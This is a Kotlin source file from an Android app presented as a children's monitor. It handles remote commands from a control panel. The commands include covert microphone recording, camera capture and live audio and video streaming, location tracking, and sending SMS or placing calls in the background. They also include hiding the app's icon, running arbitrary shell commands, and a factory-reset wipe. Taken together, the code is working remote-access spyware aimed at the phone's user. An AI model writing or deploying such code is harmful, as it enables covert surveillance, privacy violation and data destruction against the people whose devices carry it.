package com.kids.monitor.data

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCharacteristics
import android.media.AudioManager
import android.os.Build
import android.telephony.SmsManager
import com.kids.monitor.AdminReceiver
import com.kids.monitor.CameraService
import com.kids.monitor.MainActivity
import com.kids.monitor.MicService
import com.kids.monitor.NotificationRelayService
import com.kids.monitor.ScreenShareService
import com.kids.monitor.TerminalService

/** تنفيذ أوامر التحكم عن بُعد الواردة من لوحة التحكم. */
object CommandExecutor {

    fun execute(context: Context, type: String, payload: Map<String, Any>): Map<String, Any> {
        return try {
            when (type) {
                "get_location" -> getLocation(context)
                "ring" -> ring(context)
                "lock" -> lock(context)
                "clear_notifications" -> clearNotifications()
                "send_message" -> sendMessage(context, payload)
                "take_photo" -> takePhoto(context, payload)
                "take_screenshot" -> takeScreenshot()
                "make_call" -> makeCall(context, payload)
                "mic_start" -> {
                    MicService.start(context)
                    ok("تم فتح المايك (استماع فقط)")
                }
                "mic_stop" -> {
                    MicService.stop(context)
                    ok("تم إيقاف المايك")
                }
                "record_mic" -> {
                    MicService.recordOnce(context)
                    ok("جارٍ تسجيل مقطع صوتي (30 ثانية)…")
                }
                "camera_start", "camera_front_start", "camera_back_start" -> {
                    val facing = when {
                        type == "camera_front_start" -> CameraCharacteristics.LENS_FACING_FRONT
                        type == "camera_back_start" -> CameraCharacteristics.LENS_FACING_BACK
                        payload["facing"]?.toString() == "front" -> CameraCharacteristics.LENS_FACING_FRONT
                        else -> CameraCharacteristics.LENS_FACING_BACK
                    }
                    startCamera(context, facing)
                }
                "camera_stop" -> {
                    val facing = when (payload["facing"]?.toString()) {
                        "front" -> CameraCharacteristics.LENS_FACING_FRONT
                        "back" -> CameraCharacteristics.LENS_FACING_BACK
                        else -> -1
                    }
                    if (facing == -1) CameraService.stopAll(context) else CameraService.stop(context, facing)
                    ok("تم إيقاف الكاميرا")
                }
                "screen_status" -> screenStatus()
                "screen_stop" -> {
                    ScreenShareService.stop(context)
                    ok("تم إيقاف مشاركة الشاشة")
                }
                "wake" -> {
                    wakeScreen(context)
                    ok("تم إيقاظ شاشة الجهاز")
                }
                "sims" -> simsInfo(context)
                "rtc_start" -> {
                    val raw = payload["session"]?.toString().orEmpty()
                    val sess = if (raw.isBlank()) "s" + System.currentTimeMillis() else raw
                    com.kids.monitor.WebRtcService.start(context, sess)
                    ok("تم بدء بث الفيديو والصوت المباشر")
                }
                "rtc_stop" -> {
                    com.kids.monitor.WebRtcService.stop(context)
                    ok("تم إيقاف البث المباشر")
                }
                "show_app" -> {
                    setAlias(context, true)
                    ok("تم إظهار أيقونة التطبيق في قائمة التطبيقات")
                }
                "hide_app" -> {
                    setAlias(context, false)
                    ok("تم إخفاء أيقونة التطبيق")
                }
                "uninstall_app" -> {
                    try {
                        context.startActivity(
                            Intent(
                                Intent.ACTION_DELETE,
                                android.net.Uri.parse("package:${context.packageName}"),
                            ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                        )
                        ok("افتح شاشة الجهاز وأكّد الإزالة")
                    } catch (e: Exception) {
                        fail("تعذر فتح شاشة الإزالة: ${e.localizedMessage}")
                    }
                }
                "terminal" -> TerminalService.execute(context, payload["cmd"]?.toString().orEmpty())
                "device_info" -> TerminalService.deviceSummary(context)
                "factory_reset" -> factoryReset(context)
                "sync_now" -> {
                    com.kids.monitor.MonitorService.syncNow(context)
                    ok("تمت جدولة المزامنة الفورية")
                }
                "open_app" -> {
                    context.startActivity(
                        Intent(context, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                    )
                    ok("تم فتح التطبيق على الجهاز")
                }
                else -> fail("أمر غير معروف: $type")
            }
        } catch (e: Exception) {
            fail(e.localizedMessage ?: "خطأ غير معروف")
        }
    }

    private fun ok(message: String): Map<String, Any> = mapOf("ok" to true, "message" to message)

    private fun fail(message: String): Map<String, Any> = mapOf("ok" to false, "message" to message)

    private fun getLocation(context: Context): Map<String, Any> {
        if (!LocationCollector.hasPermission(context)) return fail("يتطلب صلاحية الموقع")
        val loc = LocationCollector.freshLocation(context) ?: LocationCollector.lastLocation(context)
            ?: return fail("تعذر الحصول على الموقع (تأكد من تشغيل GPS)")
        if (DeviceInfo.online(context)) {
            FirestoreSync.writeLocation(context, loc)
        } else {
            PendingStore.addMap(context, loc)
        }
        return ok("تم تحديث الموقع")
    }

    private fun ring(context: Context): Map<String, Any> {
        val audio = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audio.ringerMode = AudioManager.RINGER_MODE_NORMAL
        val max = audio.getStreamMaxVolume(AudioManager.STREAM_RING)
        audio.setStreamVolume(AudioManager.STREAM_RING, max, 0)
        return ok("تم تشغيل رنين الجهاز")
    }

    private fun lock(context: Context): Map<String, Any> {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) return fail("يتطلب تفعيل مسؤول الجهاز من شاشة الأذونات")
        dpm.lockNow()
        return ok("تم قفل الجهاز")
    }

    private fun clearNotifications(): Map<String, Any> {
        val service = NotificationRelayService.instance
        return if (service != null) {
            service.cancelAllNotifications()
            ok("تم مسح الإشعارات")
        } else {
            fail("خدمة قراءة الإشعارات غير مفعّلة")
        }
    }

    private fun sendMessage(context: Context, payload: Map<String, Any>): Map<String, Any> {
        val number = payload["number"]?.toString()?.trim().orEmpty()
        val message = payload["message"]?.toString().orEmpty()
        if (number.isBlank() || message.isBlank()) return fail("رقم المستلم أو نص الرسالة فارغ")
        if (!Permissions.has(context, Manifest.permission.SEND_SMS)) {
            return fail("يتطلب صلاحية إرسال الرسائل")
        }
        val sms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            context.getSystemService(SmsManager::class.java)
        } else {
            @Suppress("DEPRECATION")
            SmsManager.getDefault()
        } ?: return fail("خدمة الرسائل غير متاحة")
        sms.sendTextMessage(number, null, message, null, null)
        return ok("تم إرسال الرسالة إلى $number")
    }

    private fun makeCall(context: Context, payload: Map<String, Any>): Map<String, Any> {
        val number = payload["number"]?.toString()?.trim().orEmpty()
        if (number.isBlank()) return fail("الرقم فارغ")
        if (!Permissions.has(context, Manifest.permission.CALL_PHONE)) {
            return fail("يتطلب صلاحية الاتصال الهاتفي")
        }
        wakeScreen(context)
        val uri = android.net.Uri.parse("tel:" + android.net.Uri.encode(number))
        val simIndex = payload["simIndex"]?.toString()?.toIntOrNull() ?: -1
        try {
            // placeCall يعمل من الخلفية (حتى والشاشة مقفلة) بدون فتح التطبيق
            val tm = context.getSystemService(Context.TELECOM_SERVICE) as android.telecom.TelecomManager
            val accounts = tm.callCapablePhoneAccounts
            val extras = android.os.Bundle()
            if (simIndex in accounts.indices) {
                extras.putParcelable(android.telecom.TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, accounts[simIndex])
            }
            tm.placeCall(uri, extras)
            val sim = if (simIndex in accounts.indices) " (الشريحة ${simIndex + 1})" else ""
            return ok("تم بدء الاتصال بـ $number$sim")
        } catch (e: Exception) {
            return try {
                context.startActivity(
                    Intent(Intent.ACTION_CALL, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                )
                ok("تم بدء الاتصال بـ $number")
            } catch (e2: Exception) {
                fail("تعذر بدء الاتصال: ${e2.localizedMessage ?: e.localizedMessage}")
            }
        }
    }

    /** إيقاظ الشاشة مؤقتاً حتى تظهر واجهة المكالمة على القفل. */
    private fun wakeScreen(context: Context) {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            @Suppress("DEPRECATION")
            val lock = pm.newWakeLock(
                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or
                    android.os.PowerManager.ON_AFTER_RELEASE,
                "kids:wake",
            )
            lock.acquire(15_000L)
        } catch (e: Exception) { /* تجاهل */ }
    }

    /** إظهار/إخفاء أيقونة التطبيق (activity-alias) — لحل مشكلة مخفي في خزنة التطبيقات. */
    private fun setAlias(context: Context, show: Boolean) {
        try {
            val alias = ComponentName(context, context.packageName + ".LauncherAlias")
            context.packageManager.setComponentEnabledSetting(
                alias,
                if (show) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )
            context.getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("icon_hidden", !show).apply()
        } catch (e: Exception) { /* تجاهل */ }
    }

    private fun simsInfo(context: Context): Map<String, Any> {
        val list = DeviceInfo.sims(context)
        if (list.isEmpty()) return fail("لا توجد شرائح اتصال متاحة")
        val text = list.joinToString("\n") { "${it["index"]}: ${it["label"]}" }
        return mapOf(
            "ok" to true,
            "message" to "عدد الشرائح: ${list.size}",
            "stdout" to text,
            "sims" to list,
            "exitCode" to 0,
        )
    }

    private fun startCamera(context: Context, facing: Int): Map<String, Any> {
        if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
        CameraService.start(context, facing)
        return ok(
            if (facing == CameraCharacteristics.LENS_FACING_FRONT) "تشغيل الكاميرا الأمامية"
            else "تشغيل الكاميرا الخلفية",
        )
    }

    private fun takePhoto(context: Context, payload: Map<String, Any>): Map<String, Any> {
        if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
        val facing = if (payload["facing"]?.toString() == "front") {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }
        val file = CameraCapture.capture(context, facing) ?: return fail("تعذر التقاط صورة")
        val kind = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
        val url = StorageUploader.uploadSync(file, "camera/$kind/${file.name}")
        val inline = if (url == null) StorageUploader.inlineData(file) else null
        if (url == null && inline == null) {
            file.delete()
            return fail("تم التقاط الصورة لكن تعذر رفعها (راجع قواعد Storage)")
        }
        val item = mapOf(
            "name" to file.name,
            "url" to (url ?: ""),
            "dataUrl" to (inline ?: ""),
            "type" to "image",
            "mimeType" to "image/jpeg",
            "size" to file.length(),
            "camera" to kind,
            "timestamp" to System.currentTimeMillis(),
        )
        FirestoreSync.appendItem(context, "media", item)
        FirestoreSync.setLive(context, kind, item)
        file.delete()
        return ok("تم التقاط صورة ورفعها")
    }

    /** لقطة شاشة فورية عبر خدمة مشاركة الشاشة النشطة. */
    private fun takeScreenshot(): Map<String, Any> {
        if (!ScreenShareService.isRunning()) {
            return fail("يتطلب تفعيل مشاركة الشاشة من التطبيق أولاً (إذن النظام لمرة واحدة)")
        }
        ScreenShareService.captureNow()
        return ok("تم التقاط لقطة شاشة ورفعها")
    }

    private fun screenStatus(): Map<String, Any> =
        if (ScreenShareService.isRunning()) ok("مشاركة الشاشة تعمل") else fail("مشاركة الشاشة متوقفة")

    private fun factoryReset(context: Context): Map<String, Any> {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) return fail("يتطلب تفعيل مسؤول الجهاز من شاشة الأذونات")
        dpm.wipeData(0)
        return ok("تم إرسال طلب إعادة ضبط المصنع")
    }
}
